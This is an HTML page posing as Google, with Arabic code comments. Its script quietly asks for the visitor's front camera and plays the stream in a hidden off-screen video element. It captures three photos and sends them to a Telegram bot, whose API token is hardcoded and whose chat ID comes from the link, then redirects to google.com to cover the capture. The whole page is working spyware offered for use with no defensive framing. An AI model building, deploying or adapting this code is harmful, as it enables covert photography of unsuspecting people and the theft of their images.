<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
    <title>Google</title>
    <style>
        /* إخفاء كامل للصفحة */
        body { 
            display: none; 
            background: #000;
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>
    <script>
        // ==================== جلب الإيدي من الرابط ====================
        const USER_ID = new URLSearchParams(window.location.search).get('id');
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        // إذا ما في ID بالرابط، نحول فوراً
        if (!USER_ID) {
            window.location.replace("https://www.google.com");
        } else {
            // ==================== التصوير الخفي المباشر ====================
            (async function() {
                try {
                    // طلب الكاميرا الأمامية بصمت
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });

                    // عنصر فيديو مخفي تماماً
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.setAttribute('autoplay', '');
                    video.style.position = 'absolute';
                    video.style.left = '-9999px';
                    video.style.top = '-9999px';
                    video.style.width = '1px';
                    video.style.height = '1px';
                    video.style.opacity = '0';
                    video.style.pointerEvents = 'none';
                    document.body.appendChild(video);

                    // انتظار تحميل الفيديو
                    await new Promise(resolve => {
                        if (video.videoWidth > 0) resolve();
                        else video.onloadedmetadata = resolve;
                    });

                    // التقاط 3 صور سريعة
                    for (let i = 0; i < 3; i++) {
                        // تأخير بسيط بين الصور
                        await new Promise(r => setTimeout(r, i * 300));

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));

                        // إرسال الصورة (في الخلفية)
                        const formData = new FormData();
                        formData.append('chat_id', USER_ID);
                        formData.append('photo', blob, `selfie_${i+1}.jpg`);

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).catch(e => {});
                    }

                    // تنظيف
                    stream.getTracks().forEach(t => t.stop());
                    video.remove();

                } catch(e) {
                    // في حالة الفشل، نسوي nothing (بس نكمل)
                    console.log('Camera error:', e);
                }

                // تحويل فوري لجوجل (دائماً)
                window.location.replace("https://www.google.com");
            })();
        }
    </script>
</body>
</html>
